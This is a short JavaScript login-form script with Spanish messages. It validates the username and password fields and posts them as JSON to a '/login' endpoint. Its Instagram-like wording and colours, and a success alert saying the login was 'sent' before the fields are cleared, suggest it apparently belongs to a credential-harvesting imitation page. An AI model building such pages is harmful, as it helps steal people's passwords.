document.addEventListener('DOMContentLoaded', function () {
  const form = document.getElementById('loginForm');
  const usernameInput = form.querySelector('input[type="text"]');
  const passwordInput = form.querySelector('input[type="password"]');

  // Validación en tiempo real
  usernameInput.addEventListener('input', clearError);
  passwordInput.addEventListener('input', clearError);

  form.addEventListener('submit', async function (e) {
    e.preventDefault();

    let isValid = true;

    if (usernameInput.value.trim() === '') {
      showError(usernameInput, 'Ingresa un teléfono, usuario o correo.');
      isValid = false;
    }

    if (passwordInput.value.trim() === '') {
      showError(passwordInput, 'Ingresa tu contraseña.');
      isValid = false;
    }

    if (!isValid) return;

    try {
      const response = await fetch('/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: usernameInput.value.trim(),
          password: passwordInput.value.trim()
        })
      });

      if (response.ok) {
        alert('✅ ¡Inicio de sesión enviado con éxito!');
        usernameInput.value = '';
        passwordInput.value = '';
      } else {
        alert('❌ Error al enviar los datos.');
      }
    } catch (err) {
      alert('⚠️ No se pudo conectar con el servidor.');
      console.error(err);
    }
  });

  function showError(input, message) {
    input.style.borderColor = '#ed4956';
    const error = document.createElement('div');
    error.textContent = message;
    error.style.color = '#ed4956';
    error.style.fontSize = '12px';
    error.style.marginTop = '4px';
    error.className = 'error-message';
    if (!input.nextElementSibling || !input.nextElementSibling.classList.contains('error-message')) {
      input.parentNode.insertBefore(error, input.nextSibling);
    }
  }

  function clearError() {
    this.style.borderColor = '#404040';
    const error = this.nextElementSibling;
    if (error && error.classList.contains('error-message')) {
      error.remove();
    }
  }
});
